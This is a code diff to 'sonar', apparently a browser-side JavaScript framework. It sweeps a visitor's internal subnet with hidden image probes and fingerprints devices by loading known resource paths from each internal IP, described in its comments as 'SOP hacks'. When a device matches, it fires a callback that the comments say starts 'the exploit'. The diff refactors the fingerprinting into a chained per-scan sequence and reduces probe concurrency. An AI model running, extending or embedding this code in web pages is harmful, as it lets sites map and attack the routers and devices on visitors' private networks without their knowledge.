@@ -2,6 +2,7 @@ var sonar = {
     'debug': false,
     'fingerprints': [],
     'internal_hosts': {},
+    'scans': {},
 
     /*
      * Start the exploit
@@ -21,16 +22,20 @@ var sonar = {
     },
 
     /*
-     * Take enumerated IP addresses and run through the fingerprints to identify the devices.
+     * Kicks off enumeration of devices (generating a unique id to keep track of the onload chain)
      */
     'identify_device': function( ip ) {
         var resource_list = [];
         sonar.fingerprints.forEach( function( fingerprint, index, all ) {
-            for( i = 0; i < fingerprint.fingerprints.length; i++ ) {
-                if( !resource_list.contains( fingerprint.fingerprints[i] ) ) {
-                  sonar.check_resource_exists( fingerprint.fingerprints[i], sonar.internal_host_manager, ip );
-                  resource_list.push( fingerprint.fingerprints[i] );
-                }
+            if( fingerprint.fingerprints.length > 0 ) {
+                var random_id = sonar.generate_random_id();
+                sonar.scans[ random_id ] = {
+                    'offset': 0,
+                    'name': fingerprint.name,
+                    'fingerprints': fingerprint.fingerprints,
+                    'callback': fingerprint.callback,
+                };
+                sonar.check_resource_exists( sonar.scans[ random_id ].fingerprints[0], ip, random_id );
             }
         });
     },
@@ -38,43 +43,23 @@ var sonar = {
     /*
      * This function keeps the records for what resources have been mapped to which hosts.
      */
-    'internal_host_manager': function( ip, path ) {
-        if( sonar.internal_hosts[ ip ] === undefined ) {
-            sonar.internal_hosts[ ip ] = [];
+    'internal_host_manager': function( ip, resource, id, error ) {
+        if( error ) {
+            delete sonar.scans[ id ];
+            return;
         }
 
-        // Add newly enumerate resource to host map
-        if ( sonar.internal_hosts[ ip ].indexOf( path ) == -1 ) {
-            sonar.internal_hosts[ ip ].push( path );
-        }
-
-        // Check to see if any of the fingerprints match, if so start the exploit!
-        sonar.check_matches();
-    },
-
-    /*
-     * Check if there are any fingerprint matches, if so call the respective function to start the exploit.
-     */
-    'check_matches': function() {
-        for( var index in sonar.internal_hosts ) {
-            sonar.internal_hosts[ index ].sort();
-            self.fingerprints.forEach( function( fingerprint ) {
-                fingerprint.fingerprints.sort();
-                if( fingerprint.fingerprints.equals( sonar.internal_hosts[ index ]) ) {
-                    // Check to see if this fingerprint has been triggered before. Prevents double triggers.
-                    if( fingerprint.called === undefined ) {
-                        fingerprint.called = [];
-                    }
-
-                    if ( fingerprint.called.indexOf( index ) == -1 ) {
-                        fingerprint.called.push( index );
-                        if( sonar.debug ) {
-                          alert( 'Found "' + fingerprint.name + '" at ' + index );
-                        }
-                        fingerprint.callback( index );
-                    }
-                }
-            });
+        // If it's the last element then call it's callback.
+        if( sonar.scans[ id ].fingerprints[ sonar.scans[ id ].fingerprints.length - 1 ] == resource ) {
+            if( sonar.debug ) {
+                alert( '[DEBUG][' + id + '] Found "' + sonar.scans[ id ].name + '" at ' + ip );
+            }
+            sonar.scans[ id ].callback( ip );
+            delete sonar.scans[ id ];
+            return;
+        } else {
+            sonar.scans[ id ].offset++;
+            sonar.check_resource_exists( sonar.scans[ id ].fingerprints[ sonar.scans[ id ].offset ], ip, id );
         }
     },
 
@@ -134,8 +119,12 @@ var sonar = {
         };
         document.body.appendChild(img);
         img.style.display = 'none';
-        img.onload = function() { onResult(true); };
-        img.onerror = function() { onResult(false); };
+        img.onload = function() { 
+            onResult(true);
+        };
+        img.onerror = function() { 
+            onResult(false);
+        };
         img.src = 'https://' + ip + ':' + ~~(1024+1024*Math.random()) + '/' + sonar.generate_random_id() + '?' + Math.random();
         setTimeout(function() { if (img) img.src = ''; }, timeout + 500);
     },
@@ -145,7 +134,7 @@ var sonar = {
         var timeout = 5000;
         var done = false;
         var found = [];
-        var q = new TaskController(10, onDone);
+        var q = new TaskController(6, onDone);
         for (var i = 1; i < 256; ++i) {
             q.queue((function(i, cb) {
                 sonar.probe_ip(net + i, timeout, function(ip, success) {
@@ -206,7 +195,7 @@ var sonar = {
     /*
      * Internal host fingerprinting via SOP hacks
      */
-    'check_resource_exists': function( resource, callback, ip ) {
+    'check_resource_exists': function( resource, ip, id ) {
         var full_source = 'http://' + ip + resource;
         var element_id = sonar.generate_random_id();
         if( resource.toLowerCase().endsWith( '.css' ) ) {
@@ -215,47 +204,27 @@ var sonar = {
             resourceref.setAttribute( "type", "text/css" );
             resourceref.setAttribute( "rel", "stylesheet" );
             resourceref.setAttribute( "href", full_source );
-
-            resourceref.addEventListener( "error", function( event ) {
-                document.getElementById( element_id ).remove();
-            }, false );
-
-            resourceref.addEventListener( "load", function( event ) {
-                document.getElementById( element_id ).remove();
-                sonar.internal_host_manager( ip, resource );
-            }, false );
-            document.getElementsByTagName("head")[0].appendChild( resourceref );
-        } else if ( resource.toLowerCase().endsWith( '.png' ) || resource.endsWith( '.gif') || resource.endsWith( '.jpg' ) || resource.endsWith( '.tiff' ) ) {
+        } else if ( resource.toLowerCase().endsWith( '.png' ) || resource.toLowerCase().endsWith( '.gif') || resource.toLowerCase().endsWith( '.jpg' ) || resource.toLowerCase().endsWith( '.tiff' ) ) {
             var resourceref = document.createElement( "img" );
             resourceref.setAttribute( "id", element_id );
             resourceref.setAttribute( "src", full_source );
-
-            resourceref.addEventListener( "error", function( event ) {
-                document.getElementById( element_id ).remove();
-            }, false );
-
-            resourceref.addEventListener( "load", function( event ) {
-                document.getElementById( element_id ).remove();
-                sonar.internal_host_manager( ip, resource );
-            }, false );
-            document.getElementsByTagName("head")[0].appendChild( resourceref );
         } else if ( resource.toLowerCase().endsWith( '.js' ) ) {
             var resourceref = document.createElement( "script" );
             resourceref.setAttribute( "id", "testresource" );
             resourceref.setAttribute( "src", full_source );
-
-            resourceref.addEventListener( "error", function( event ) {
-                document.getElementById( element_id ).remove();
-            }, false );
-
-            resourceref.addEventListener( "load", function( event ) {
-                document.getElementById( element_id ).remove();
-                sonar.internal_host_manager( ip, resource );
-            }, false );
-            document.getElementsByTagName("head")[0].appendChild( resourceref );
         } else {
-            // Not a detectable resource
+            return false;
         }
+        resourceref.addEventListener( "error", function( event ) {
+            document.getElementById( element_id ).remove();
+            sonar.internal_host_manager( ip, resource, id, true );
+        }, false );
+
+        resourceref.addEventListener( "load", function( event ) {
+            document.getElementById( element_id ).remove();
+            sonar.internal_host_manager( ip, resource, id, false );
+        }, false );
+        document.getElementsByTagName("head")[0].appendChild( resourceref );
     },
 }
 
